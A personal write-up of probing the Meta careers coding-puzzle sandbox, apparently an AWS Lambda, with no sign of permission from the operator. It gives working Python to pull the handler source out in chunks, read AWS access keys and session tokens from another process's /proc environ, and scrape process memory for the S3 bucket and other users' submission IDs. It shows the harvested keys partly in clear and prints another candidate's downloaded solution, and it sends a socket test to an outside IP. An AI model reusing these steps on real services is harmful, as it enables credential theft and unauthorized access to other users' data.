# Notes on [metacareers](https://metacareers.com/) Coding Puzzles site...

## Pre-Intro:

While this may not be a CTF challenge, with no defined "flag" to capture, I do think it fits in the general category of writeups. This is a story of how I easily get bored and start poking around a site that lets you execute arbitrary code.

## Intro

In order to apply for a job at Meta, you sign up on their [metacareers](https://metacareers.com/) platform for streamlining the interview process. We've all heard the stories about coding interviews at the FAANG companies, and the general
perception is that you have to cram and prepare for these in advance.

One thing that has always stressed me out has been live coding interviews. I prefer to have a coding assignment sent to me so I can do it on my own time and not worry about someone looking over my shoulder, but I understand the problems
that presents, and that watching someone work through a problem in real time gives the interviewer valuable insight.

The site provides helpful coding puzzles so that you can practice ahead of time. That's actually really cool, and helpful. It lets you get familiar with the interface etc.
![meta_sections](./images/1-meta_sections.png)
I've done a fair number of leetcode problems, and so doing some practice challenges was interesting, but I get bored easily. I'm more curious about how everything is wired up in the background. I was curious how they architected the backend
processing and how secure it is.

Here are some notes about the architecture and what I pieced together.

---

## API

The web app uses a graphQL to send the code to the backend. Some pretty mundane stuff here eg:

```gql
access_token:
__user: 0
__a: 1
__dyn: 7xeUmwkHgmwn8K2WnFwn84a2i5U4e1Fx-ewSAwHxW4E5S2WdwJw8-0Boe8hwem0nCq1ewcG0KEswaq1xwEwlU-0nSUS1vwoE2LwBgao8812E5W3S1lwlE-Uqwo88qoTKawKw9O1iwKwHw8W1uwa-7V8y0h-2S3qazoiwfe0Lo4K2e1Fw
__csr:
__req: u
__hs: 19263.BP:DEFAULT.2.0.0.0.0
dpr: 1
__ccg: UNKNOWN
__rev: 1006285001
__s: ivh6sa:c7xtcg:uzgb3v
__hsi: 7148525855381911966
__comet_req: 0
fb_dtsg: NAcPjIS5J_FNrnJSU6dn2yDurDwRKjhhyG67bkAnYAEkdMEYWOb3L5w:42:1664304244
jazoest: 25424
lsd: -KlKJ_GiBRnbRWfrvO2Cd2
__spin_r: 1006285001
__spin_b: trunk
__spin_t: 1664395876
__jssesw: 1
fb_api_caller_class: RelayModern
fb_api_req_friendly_name: CandidatePortalAsyncCodeExecutionMutation
variables: {"input":{"client_mutation_id":"f7a06c16-9eab-4464-9296-526b3896debd","actor_id":"0","programming_language":"PYTHON3","source_code":"---","session_id":"1664304235910_530975114","problem_id":"513411323351554","problem_set_id":"4278651905498002","editable_line_numbers":[1,2],"surface":"CODING_PUZZLES","test_case_sets_to_grade":"SAMPLES_ONLY","should_skip_evaluation":false}}
server_timestamps: true
doc_id: 4743360595790243
```

I spent very little time looking into this. It may be interesting to manipulate some of these fields, but in general I want to know more about what's actually getting executed. The response to the data sent provides a submission_id that is
interesting for later.

---

## Backend Processing

The first thing I wanted to see was how locked down everything was. Could I just run a:

```python
import os
os.system('ls /')
```

And sure enough I could. It did not seem like any of the code was being modified for an exclusion list etc...

Ok, so let's take a look at the environment variables and see what they have:

```python
import os
print(os.environ)
```

This gets us some fairly simple stuff, one thing I noticed, was that it truncated the stdout output (more on that later). Definitely nothing overly exciting, but some hints about what's going on in the system. EG:
`'LAMBDA_TASK_ROOT': '/var/task'`

Ahhh, so our code is running in a lambda... the environment variables don't show any AWS env variables that I would hope are there. Some additional information is that the processes are running as a non-privileged user: `sbx_user1051` . And
the processes all seem to be running as the same user:

```shell
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/12/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/1/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/3320/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/3321/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/3322/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/3323/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/3324/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/3326/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/8/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/self/environ
-r-------- 1 sbx_user1051 990 0 Sep 29 14:50 /proc/thread-self/environ
```

More on the unintended effects of this later on. But for now, let's look to see if we can find the lambda handler code.

---

## Exfiltrating the handler code

Well finding the code was simple, it was in an `app.py` file in the /var/task directory. Ok, now to exfiltrate it. Just printing the contents to stdout was painful since it truncated it. So we'll have to chunk it.

Turns out that the main file system overlay is read-only, as you would expect. But the mount command shows that `/tmp` is writable, so let's cp the file over there. We'll then gzip it, and in our python script we'll open the file, read in
the contents, and base64 encode it. Then output around 1kb at a time.

After a couple of requests and chunks, we get the fully exfiltrated data. Now we can reverse the process and extract it. This give us code we can review:

```python
# Copyright 2021 Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: LicenseRef-.amazon.com.-AmznSL-1.0
# Licensed under the Amazon Software License  http://aws.amazon.com/asl/

import base64, boto3, glob, psutil, subprocess, sys, time, os, shutil, stat

from aws_lambda_powertools import Logger, Tracer

# The Step Function limit on data transferred between steps is 256kB.
# So with ~40 test cases per problem, that's about 5kB per test case
# plus some room for overhead.
OUTPUT_SENTINEL = "BEGIN_RETURN_VALUE_OUTPUT"
NON_EVALUATIVE_TEXT_LIMIT = 1001
EVALUATIVE_TEXT_LIMIT = 4001

# start logger and tracing of function
logger = Logger()
modules_to_be_patched = ["boto3"]
tracer = Tracer(patch_modules=modules_to_be_patched)

# set up client to s3
s3_client = boto3.client("s3")


def removeUnprintableChars(output):
    # This is string.printable but without tab, carriage return, form feed, or
    # vertical tab. Additionally, we allow U+2713 (check mark) and U+2717 (X)
    # because these are used in Coding Practice.
    printableChars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ \n\u2713\u2717"
    return "".join(char for char in output if char in printableChars)


# run a single command using subprocess
@tracer.capture_method(capture_response=True)
def subprocess_cmd(run_cmd):
    print("starting subprocess_cmd " + str(run_cmd))

    stdout = ""
    stderr = ""
    result = "SUCCESS"
    exit_code = 0
    run_memory = 0

    try:
        # run subprocess
        process = subprocess.Popen(
            run_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            cwd=".",
            text=True,
        )

        # get pid details
        pid = process.pid
        p = psutil.Process(pid)

        run_memory = p.memory_info().rss

        stdout, stderr = process.communicate()
        exit_code = process.wait()

        print(result, "cmd_out", stdout, stderr, str(exit_code), run_memory)

    except Exception as e:
        strerr = str(e)
        stdout = ""
        result = "SYSTEM_ERROR"
        exit_code = 128
        run_memory = 0

        print(e)
        print(result, "cmd_out", stdout, stderr)

    # remove newline chars from code build and execution output
    return stdout, stderr, result, exit_code, run_memory


# get file from s3 and store to /tmp
@tracer.capture_method(capture_response=True)
def s3_get(s3_uri, outpath, s3_bucket):
    print("getting " + s3_uri + " to outpath " + outpath + " in bucket " + s3_bucket)
    s3obj = s3_client.download_file(s3_bucket, s3_uri, outpath)

    return outpath


# put file from /tmp and store to s3
@tracer.capture_method(capture_response=True)
def s3_put(local_code_path, s3_bucket, upload_uri):
    print("putting " + local_code_path + " to outpath " + upload_uri)
    s3obj = s3_client.upload_file(local_code_path, s3_bucket, upload_uri)

    return upload_uri


# clean /tmp dir fully
@tracer.capture_method(capture_response=True)
def clean_tmp_dir():
    dir_files = glob.glob("/tmp/*")
    print("clean_tmp_start " + str(dir_files))

    # delete all files and directories from /tmp
    for f in dir_files:
        try:
            mode = os.stat(f).st_mode
            if stat.S_ISSOCK(mode) or stat.S_ISFIFO(mode):
                print("Skipping socket/pipe %s" % f)
            elif os.path.isfile(f):
                print("Deleting file %s" % f)
                os.remove(f)
            else:
                print("Deleting directory %s" % f)
                shutil.rmtree(f)
        except Exception as _e:
            print("Failed to delete %s, probably already deleted" % f)

    dir_files = glob.glob("/tmp/*")
    print("clean_tmp_end " + str(dir_files))


def needs_compiled_code(language):
    if language == "C":
        return True
    if language == "CSHARP":
        return True
    if language == "CPP":
        return True
    if language == "JAVA":
        return True
    if language == "KOTLIN":
        return True
    if language == "SCALA":
        return True
    return False


# run code
@tracer.capture_method(capture_response=True)
def run_code(eventstr):
    s3_bucket = eventstr["s3_bucket"]
    submission_id = str(eventstr["submission_id"])
    upload_uri = eventstr["upload_uri"]
    language = eventstr["user_code"]["language"]
    source_file_name = eventstr["user_code"]["file_name"]
    time_limit_in_ms = eventstr["time_limit_per_case_in_ms"]
    memory_limit_in_bytes = eventstr["memory_limit_in_bytes"]

    # download input file
    input_file_path = submission_id + "/" + str(eventstr["inputfile"]) + ".in"
    s3_get(input_file_path, "/tmp/input.in", s3_bucket)

    # download source code
    source_code_path = submission_id + "/" + source_file_name
    s3_get(source_code_path, "/tmp/source.txt", s3_bucket)

    # download compiled code if necessary
    if needs_compiled_code(language):
        compiled_code_path = submission_id + "/compiled_code"
        s3_get(compiled_code_path, "/tmp/compiled_code", s3_bucket)

        # Give execution permissions to code using chmod
        # Note that this isn't necessarily an executable file (e.g. for Java)
        subprocess_cmd("chmod +x /tmp/compiled_code")

    # Write execution command to a file for easier wrapping in the next step
    subprocess_cmd(
        "echo '%s' > /tmp/execution.sh && chmod +x /tmp/execution.sh"
        % eventstr["execution_command"]
    )

    # Wrap the execution command in `ulimit` to enforce time and memory limits
    # We also use `time` to compute CPU time (vs. wall time)
    #
    # Note that the time limit passed to `ulimit` is higher than the actual limit.
    # This is because ulimit can kill a process a few milliseconds earlier than
    # the limit given, which then looks like an MLE because a KILL signal gets
    # sent.
    command_inputs = (
        int(1.3 * time_limit_in_ms / 1000) + 1,
        memory_limit_in_bytes // 1024,
    )
    execution_command = (
            "bash -c 'ulimit -S -s 512000 -t %d -m %d; " % command_inputs
            + "timeout 45s /usr/bin/time -p /tmp/execution.sh > /tmp/stdout 2> /tmp/stderr'"
    )

    # Store the AWS environment variables, then unset them all so
    # they aren't accessible by the user's submission
    stored_env_values = {}
    for key in os.environ:
        if 'AWS' in key:
            stored_env_values[key] = os.environ[key]

    for key in stored_env_values:
        del os.environ[key]

    # Start timer
    run_start_time = time.time() * 1000

    # Run the execution command, capture output and status
    _stdout, _stderr, result, exit_code, memory_used_in_bytes = subprocess_cmd(
        execution_command
    )

    # Stop timer and get wall time
    run_end_time = time.time() * 1000
    execution_time_in_ms = round(run_end_time - run_start_time)
    fall_back_to_wall_time = False

    # Restore the hidden environment variables
    for key in stored_env_values:
        os.environ[key] = stored_env_values[key]

    try:
        stdout = removeUnprintableChars(open("/tmp/stdout").read())
        stderr = removeUnprintableChars(open("/tmp/stderr").read())
    except FileNotFoundError:
        # This happens when the program is terminated before it even gets a chance
        # to touch the stdout and stderr files. We mark it as a RUNTIME_ERROR
        # here, but if it turns out that memory was exceeded then the result will
        # be updated to MEMORY_LIMIT_EXCEEDED below.
        stdout = ""
        stderr = "<<No error message available>>"
        result = "RUNTIME_ERROR"
        fall_back_to_wall_time = True
    except MemoryError:
        # This happens when too much is written to stdout/stderr for us to even
        # read
        stdout = ""
        stderr = "<<Too much output>>"
        result = "RUNTIME_ERROR"
        fall_back_to_wall_time = True
    except UnicodeDecodeError:
        # This happens when strange bytes get written
        stdout = ""
        stderr = "<<Output could not be decoded>>"
        result = "RUNTIME_ERROR"
        fall_back_to_wall_time = True

    print("Stdout:", stdout[:NON_EVALUATIVE_TEXT_LIMIT])
    print("Stderr:", stderr[:NON_EVALUATIVE_TEXT_LIMIT])

    if not fall_back_to_wall_time:
        try:
            # We get the CPU time from the `time` command which is the last three lines
            # of stderr. Note that we get 10ms granularity (which is totally fine).
            stderr_lines = stderr.strip().split("\n")
            time_stats = stderr_lines[-3:]
            stderr = "\n".join(stderr_lines[:-3])

            real_time, user_time, sys_time = [float(x.split()[-1]) for x in time_stats]
            cpu_time_in_ms = int(1000 * (user_time + sys_time))
        except:
            fall_back_to_wall_time = True

    if fall_back_to_wall_time:
        # If there was an MLE, then `time` will get killed as well and we won't
        # have any time stats. Similarly, if we can't read from stderr then we
        # also won't have any time stats. We'll fall back on wall time in those
        # cases, taking care not to trigger a TLE result below.
        #
        # If `timeout` killed the execution (exit code 124), then we similarly
        # won't have time stats and will set the time used to at least limit + 1.
        if exit_code == 124:
            cpu_time_in_ms = max(execution_time_in_ms, time_limit_in_ms + 1)
        else:
            cpu_time_in_ms = min(execution_time_in_ms, time_limit_in_ms - 1)

    print("CPU time used (ms):", cpu_time_in_ms, "/", time_limit_in_ms)
    print("Wall time used (ms):", execution_time_in_ms)
    print("Memory used (bytes):", memory_used_in_bytes, "/", memory_limit_in_bytes)
    print("Exit code:", str(exit_code))

    # Trim stdout to at most 1001 chars before the output sentinel string.
    # We cap at 1001 so that the product can tell when we've gone over 1000.
    # Also trim stdout (to a larger limit) *after* the sentinel string.
    # At the moment we don't have any problems that have legitimate output longer
    # than this limit (a few thousand chars).
    sentinel_index = stdout.rfind(OUTPUT_SENTINEL)
    if sentinel_index > NON_EVALUATIVE_TEXT_LIMIT:
        stdout = (
                stdout[:NON_EVALUATIVE_TEXT_LIMIT]
                + "\n"
                + stdout[sentinel_index:sentinel_index + len(OUTPUT_SENTINEL) + EVALUATIVE_TEXT_LIMIT]
        )
    elif sentinel_index == -1:
        stdout = stdout[:EVALUATIVE_TEXT_LIMIT]
    else:
        stdout = stdout[:sentinel_index + len(OUTPUT_SENTINEL) + EVALUATIVE_TEXT_LIMIT]

    # For stderr, we strip any lines that talk about /tmp/ and then similarly
    # cap the length to 1001.
    stderr_lines = stderr.strip().split("\n")
    stderr = "\n".join([line for line in stderr_lines if "/tmp/" not in line])
    stderr = stderr[:NON_EVALUATIVE_TEXT_LIMIT]

    # Determine the result, if possible. We throw away stderr entirely unless
    # it's a RUNTIME_ERROR.
    if cpu_time_in_ms > time_limit_in_ms:
        result = "TIME_LIMIT_EXCEEDED"
        stderr = ""
    elif memory_used_in_bytes > memory_limit_in_bytes or exit_code == 137:
        # 137 is Docker's MLE exit code (a KILL signal, 128+9)
        result = "MEMORY_LIMIT_EXCEEDED"
        stderr = ""
    elif exit_code != 0:
        result = "RUNTIME_ERROR"
    elif result != "RUNTIME_ERROR":
        stderr = ""

    # return output
    return stdout, stderr, result, cpu_time_in_ms, memory_used_in_bytes, exit_code


# lambda handler
@logger.inject_lambda_context(log_event=True)
@tracer.capture_lambda_handler(capture_response=True)
def lambda_handler(event, context):
    print("eventstr " + str(event))
    eventstr = event

    # clean temp dir from files
    clean_tmp_dir()

    # run code
    stdout, stderr, result, cpu_time_in_ms, memory_used_in_bytes, exit_code = run_code(
        eventstr
    )

    # return results
    input_file = eventstr["inputfile"]

    return {
        "test_cases": {
            input_file: {
                "status": result,
                "time_used_in_ms": cpu_time_in_ms,
                "memory_used_in_bytes": memory_used_in_bytes,
                "stdout": stdout,
                "stderr": stderr,
                "exit_code": exit_code,
            }
        }
    }
```

OK, so great. We're seeing a lot more now. The submissions are downloaded from s3, run in a separate process via `subprocess.Popen` so there is good separation there.

What's next... Well the handler script accesses s3 to download the code... so can we access it as well in our code? Let's see if we can `import boto3`.

Well, that gets us an `import error`, but we know it's there somewhere on the file system because the handler uses it. So off we go to find it!

---

## Finding and using site-packages

```python
    os.system("find / -name boto3")
```

And once we have the site-packages we can just add that to our python path... There were two locations. The `/var/runtime` seemed to be the safer bet, so add that to the path in our script...

```python
    # sys.path.append("/var/lang/lib/python3.9/site-packages")
    sys.path.append("/var/runtime/")
```

---

## Process access and Environment variables

Accessing s3 requires a bucket name, and the `app.py` code shows we also need to have the `submission_id` (we have our own id from the graphql, but that's not interesting).

We are also still missing AWS environment variables with tokens and keys... Where did those disappear to? Forked processes will inherit env from the parent. Well a closer look at the `app.py` code shows what happened to those:

```python
    stored_env_values = {}
    for key in os.environ:
        if 'AWS' in key:
            stored_env_values[key] = os.environ[key]
    
    for key in stored_env_values:
        del os.environ[key]
```

So those are removed and then put back later... but let's see if we can figure out who is calling who, and if there are other processes running.

Running `ps aux` would be too easy, the package isn't installed, so lets go digging through the `/proc` filesystem...

```python
    cmds = glob.glob('/proc/*/cmdline')
    for c in cmds:
        with open(c, 'r') as f:
            print(f'c:{c}')
            print(f.read())
```

This shows that there are several layers of calls here...

```bash
c:/proc/self/cmdline
  /usr/pypy/bin/pypy/tmp/source.txt
c:/proc/thread-self/cmdline
  /usr/pypy/bin/pypy/tmp/source.txt
c:/proc/1/cmdline
  /var/rapid/init--oci-config---enable-extensions
c:/proc/8/cmdline
  /opt/extensions/cloudwatch_lambda_agent
c:/proc/12/cmdline
  /var/lang/bin/python3.9/var/runtime/bootstrap.py
c:/proc/336/cmdline
  bash-culimit -S -s 512000 -t 7 -m 524288; timeout 45s /usr/bin/time -p /tmp/execution.sh > /tmp/stdout 2> /tmp/stderr
c:/proc/337/cmdline
  timeout45s/usr/bin/time-p/tmp/execution.sh
c:/proc/338/cmdline
  /usr/bin/time-p/tmp/execution.sh
c:/proc/339/cmdline
  /bin/sh/tmp/execution.sh
c:/proc/340/cmdline
  /usr/pypy/bin/pypy/tmp/source.txt
```

Some great use of `ulimit` here to make sure things don't just go wild... But let's keep poking around. Remember how all the processes were running with the same user? Well this means that our user has read access to the environ "files" that
the proc filesystem exposes. So we're going to look at the environment variables of process 1!

Code to do that:

```python
with open('/proc/1/environ', 'r') as f:
    data = f.read()

env_list = data.split('\x00')
for l in env_list:
    print(l)
```

This shows stuff like:

```dotenv
AWS_DEFAULT_REGION=us-west-1
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/run_code_function
AWS_LAMBDA_LOG_STREAM_NAME=2022/09/28/[$LATEST]4992793f74454c1690b0ec07a33b8548
AWS_LAMBDA_FUNCTION_NAME=run_code_function
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=1500
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
```

## Grabbing AWS keys/secret/token

A bit better but no secrets yet... Let's try the next level down (`pid8`)

```dotenv
AWS_ACCESS_KEY_ID=ASIA5SWNPC4VJHOG5IFQ
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SECRET_ACCESS_KEY=mJTn2w0rBvQ0n/nwRlI3foc7xd2B7vvRjVECSpbT
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEH4aCXVzLXdlc3QtMSJGMEQCICBjsX1Icz...
```

HA, so now we have a place to get access keys from... We'll make it easy and just add those to our ENV of the running process we control...

```python
with open('/proc/8/environ', 'r') as f:
    data = f.read()

env_list = data.split('\x00')
for l in env_list:
    try:
        key, value = l.split('=', 1)
        os.environ[key] = value
        if key in ['AWS_SECRET_ACCESS_KEY', 'AWS_ACCESS_KEY_ID', 'AWS_SESSION_TOKEN']:
            print(l)
    except:
        pass
```

Nice... OK now we have boto3, we have access keys, and we can check to see if we can access s3 ourselves...

```python
Traceback (most recent call last):
   result = getSum(A, B, C)
   print(s3_client.list_buckets())
 File "/var/runtime/botocore/client.py", line 386, in _api_call
   return self._make_api_call(operation_name, kwargs)
 File "/var/runtime/botocore/client.py", line 705, in _make_api_call
   raise error_class(parsed_response, operation_name)
botocore.exceptions.ClientError: An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

Well shoot... IAM is locked down... how do we go about getting the bucket name?

---

## Finding relevant information in memory

It's got to be there somewhere in memory on the machine. The handler is `python`, it's doing logging and tracing... let's go through the mapped memory and see if we can find something, this time using `pid 12`, which is the `bootstrap.py`
process calling the script that triggers our code...:

```python
    try:
        maps_file = open("/proc/12/maps", 'r')
        mem_file = open("/proc/12/mem", 'rb', 0)
        # output_file = open("/tmp/self.dump", 'wb')
        for line in maps_file.readlines():  # for each mapped region
            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
            if m.group(3) == 'r':  # if this is a readable region
                start = int(m.group(1), 16)
                end = int(m.group(2), 16)
                mem_file.seek(start)  # seek to region start
                chunk = mem_file.read(end - start)  # read region contents
                offsets = [m.start() for m in re.finditer(b's3_bucket', chunk)]
                for offset in offsets:
                    # print(f'checking offset: {offset}')
                    leak = chunk[offset:offset + 800]
                    if b':' in leak:
                        print(leak)
    except Exception as e:
        pass
```
![memory dump](./images/2-scrape_memory.png)

Yay, that worked! Our bucket name is: `terraform-20210608051810146400000001`

What happens if we try to list the objects in the bucket.... Yup you guessed it... `Access Denied` again. So IAM is locked down well. But what about getting our own source file...

---

## Accessing S3 to get our own code submission
We can execute this locally since we have the necessary creds exported locally:
```python
import boto3
s3 = boto3.client('s3')
s3.download_file('terraform-20210608051810146400000001', '493657392343554/source.txt', '/tmp/mine')
```

And sure enough! We can download the code that we submitted! 
One interesting thing to note is that the code is a bit different than I added via the website. It has extra code that calls the function that's being tested. EG:
```python
import sys

A = int(sys.stdin.readline())
B = int(sys.stdin.readline())
C = int(sys.stdin.readline())

result = getSum(A, B, C)
print("BEGIN_RETURN_VALUE_OUTPUT")
print(result)
```

But other than that, it's not super interesting, I wonder if we can find out if we can access other people's submissions!!

---

## Grabbing other people's submissions
Back to scrapping memory of running processes, but this time we're looking for 'submission_id':

```python
  try:
    maps_file = open("/proc/12/maps", 'r')
    mem_file = open("/proc/12/mem", 'rb', 0)
    #output_file = open("/tmp/self.dump", 'wb')
    for line in maps_file.readlines():  # for each mapped region
      m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
      if m.group(3) == 'r':  # if this is a readable region
          start = int(m.group(1), 16)
          end = int(m.group(2), 16)
          mem_file.seek(start)  # seek to region start
          chunk = mem_file.read(end - start)  # read region contents
          offsets = [m.start() for m in re.finditer(b'submission_id', chunk )]
          for offset in offsets:
              #print(f'checking offset: {offset}')
              leak = chunk[offset:offset+800]
              if b':' in leak:
                  print(leak)
  except Exception as e:
    pass
```
![Submissions](./images/3-submissions.png)
![Submissions close up](./images/4-submissions.png)

Ahh, multiple submission codes... and some that have compiled code... which I'm definitely not using!

So we'll grab that, locally, no need to do this in the lambda. Note the submission id is different because I am writing the notes afterwards. Either way, this is NOT my code:

```text
>>> s3.download_file('terraform-20210608051810146400000001', '5625045057516394/source.txt', '/tmp/mine')
>>>
[1]+  Stopped                 python3
root@ae68cd6cb330:/tmp/enumerate-iam# cat /tmp/mine
using System;

// Write any using statements here
using System.Linq;
using System.Collections.Generic;

class Solution {

 public int getMaximumEatenDishCount(int N, int[] D, int K) {
   // Write your code here
   Queue<int> q = new Queue<int>();
   int result = 0;
   for (int i = 0; i < D.Length; i++) {
     if (!q.Contains(D[i])) {
       q.Enqueue(D[i]);
       result++;
       if (q.Count > K) {
         q.Dequeue();
       }
     }
   }
   return result;
 }

}


public class MainClass {
 public static void Main(string[] args) {
   int N = Int32.Parse(Console.ReadLine());
   int DRowLength = Int32.Parse(Console.ReadLine());
   string DValuesString = Console.ReadLine();
   string[] DValuesArray = DValuesString.Split(' ');
   int[] D = new int[DRowLength];
   for (int i = 0; i < DRowLength; i++) {
     D[i] = Int32.Parse(DValuesArray[i]);
   }
   int K = Int32.Parse(Console.ReadLine());

   Solution solution = new Solution();
   int result = solution.getMaximumEatenDishCount(N, D, K);
   Console.WriteLine("BEGIN_RETURN_VALUE_OUTPUT");
   Console.WriteLine(result);
 }
```

## Check for possible IAM configuration problems
I additionally ran `enumerate-iam` to see if anything interesting would show up. Nothing did.

---

## Check for networking configuration
Applications installed in a lambda are restricted and we can't just `apt-get` something. So we need to grab the networking configuration from `/proc`...
Note, that when the code runs without an error, the stdout is truncated to ~1KB. So if we run:
```python
    print(os.system('cat /proc/net/fib_trie'))
```

We get a truncated output:
```python
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 169.254.76.0/22 3 0 5
        +-- 169.254.76.0/30 2 0 1
           |-- 169.254.76.0
              /32 link BROADCAST
              /23 link UNICAST
           |-- 169.254.76.1
              /32 host LOCAL
           |-- 169.254.76.2
              /32 link UNICAST
        |-- 169.254.77.255
           /32 link BROADCAST
        +-- 169.254.79.128/30 2 0 1
           |-- 169.254.79.128
              /32 link BROADCAST
              /30 link UNICAST
           |-- 169.254.79.130
              /32 host LOCAL
           |-- 169.254.79.131
              /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127...
```
But if we raise an exception, we get all the text we're wanting to print:
```python
    print(os.system('cat /proc/net/fib_trie'))
    raise BaseException('')
```

EG:
```python
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 169.254.76.0/22 3 0 5
        +-- 169.254.76.0/30 2 0 1
           |-- 169.254.76.0
              /32 link BROADCAST
              /23 link UNICAST
           |-- 169.254.76.1
              /32 host LOCAL
           |-- 169.254.76.2
              /32 link UNICAST
        |-- 169.254.77.255
           /32 link BROADCAST
        +-- 169.254.79.128/30 2 0 1
           |-- 169.254.79.128
              /32 link BROADCAST
              /30 link UNICAST
           |-- 169.254.79.130
              /32 host LOCAL
           |-- 169.254.79.131
              /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 169.254.76.0/22 3 0 5
        +-- 169.254.76.0/30 2 0 1
           |-- 169.254.76.0
              /32 link BROADCAST
              /23 link UNICAST
           |-- 169.254.76.1
              /32 host LOCAL
           |-- 169.254.76.2
              /32 link UNICAST
        |-- 169.254.77.255
           /32 link BROADCAST
        +-- 169.254.79.128/30 2 0 1
           |-- 169.254.79.128
              /32 link BROADCAST
              /30 link UNICAST
           |-- 169.254.79.130
              /32 host LOCAL
           |-- 169.254.79.131
              /32 link BROADCAST
0
Traceback (most recent call last):
    result = getSum(A, B, C)
    raise BaseException('')
BaseException
```
It looks like we're in a private subnet, with autoip. But we're able to access S3, so some level of networking is in place. 

Another thing I wanted to try was to issue a http request to gauge if network traffic was allowed to exit the lambda:
```python
import urllib3
http = urllib3.PoolManager()
r = http.request('GET', 'http://httpbin.org/robots.txt')
print(r.data)
```
This seems to just hang and the platform reports that it's just pending:

![pending](./images/5-gql.png)

And eventually the app shows:

![error](./images/6-error.png)

Which makes sense if there are firewall rules in place, the request probably disappeared into a black hole somewhere. But it could also be due to DNS filtering. We can try to get out to some internet service somewhere via port `53`:
```python
import socket
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = ('142.93.128.13', 53)
print('connecting')
sock.connect(server_address)
sock.sendall(b'hello there from this end')
```
That just hangs as well, so the outbound connections are indeed just disappearing into the ether. 

Some more probing could be done here by setting up something within AWS infrastructure, but this lambda function is probably just sitting in a VPC with restricted rules in the gateway. So probably not much more to find here.

---

## Lambda API endpoint
AWS Lambda architecture allows for extensions. There is a variable exported in the parent processes that may be interesting:
```dotenv
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
```

The LAMBDA Runtime API is a HTTP layer that is used by the lambda runtime to communicate to the lambda service.
Doing a request to the API endpoint gets us our current submission:

```python
  import urllib3
  import json
  http = urllib3.PoolManager()
  r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
  
  jdata = json.loads(r.data)
  print(jdata['submission_id'], jdata['user_code']['language'])
```

I hesitate to go further down this path of exploration because I don't want to mess with any other submissions and risk a bad user experience for other users. Calling the API gets us a full event json message:

```json
{
  "execution_step": "run",
  "user_code": {
    "file_name": "source.txt",
    "language": "PYTHON3"
  },
  "inputfile": 308285720843346,
  "submission_id": 1154037665461358,
  "s3_region": "us-west-1",
  "time_limit_per_case_in_ms": 5000,
  "upload_uri": "source.txt",
  "execution_command": "/usr/pypy/bin/pypy /tmp/source.txt < /tmp/input.in",
  "memory_limit_in_bytes": 536870912,
  "s3_bucket": "terraform-20210608051810146400000001"
}
```

Subsequent calls get the same message with the same aws request id. It would be interesting to experiment with the other API calls to see if I could use the aws request in the response header to register a SUCCESS response.:
`/runtime/invocation/<AwsRequestId>/response`

I assume this may break things in a way that would be hard to debug without knowledge of what my specific code is doing. I don't want to cause any problems for someone else, at least not without permission and a better understanding of the impacts. So I'm going to leave it at that.

---

## Summary
In summary, things seem to be locked down pretty well. I suspect there are ways of being disruptive to the system, but gaining access to the system requires a registered account, so tracking down the offender would be fairly trivial. As far as gaining access to other users' submissions is concerned, it requires a bunch of non-trivial knowledge, the submissions will for the most part be a "work in progress", so at that point it's probably easier to just write the code yourself instead of trying to fix someone else's code.

The result validation code is somewhere that's inaccessible to us. The lambda handler returns the stdout and stderr, and some other entity parses that output to verify answers. So there's no "cheating" there. It may be interesting to bypass the handler return and use the API to send a custom return, and try to poke at the other backend services. I suspect this probably wouldn't gain us much either though.

All in all, the architecture functions well, albeit a bit slow for submissions/validations. The environment seems secure and well locked down.

I think the graphql api is also interesting and I totally glossed over it. Building a custom client to interface with the system may prove interesting, but beyond the amount of time I'd want to spend on this at the moment.

